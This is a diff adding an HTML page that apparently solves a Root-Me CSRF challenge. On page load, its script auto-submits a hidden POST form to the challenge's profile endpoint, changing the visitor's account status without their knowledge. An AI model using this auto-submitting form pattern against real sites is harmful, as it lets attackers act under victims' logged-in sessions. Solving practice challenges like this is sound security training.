@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>CSRF Submit</title>
+  </head>
+  <body>
+    <script>
+      var f = document.createElement("form");
+      f.action = "http://challenge01.root-me.org/web-client/ch22/?action=profile";
+      f.method = "POST";
+      f.enctype = "multipart/form-data";
+
+      var user = document.createElement("input");
+      user.type = "hidden"; user.name = "username"; user.value = "zizi";
+      f.appendChild(user);
+
+      var stat = document.createElement("input");
+      stat.type = "hidden"; stat.name = "status"; stat.value = "on";
+      f.appendChild(stat);
+
+      document.body.appendChild(f);
+      f.submit();
+    </script>
+  </body>
+</html>
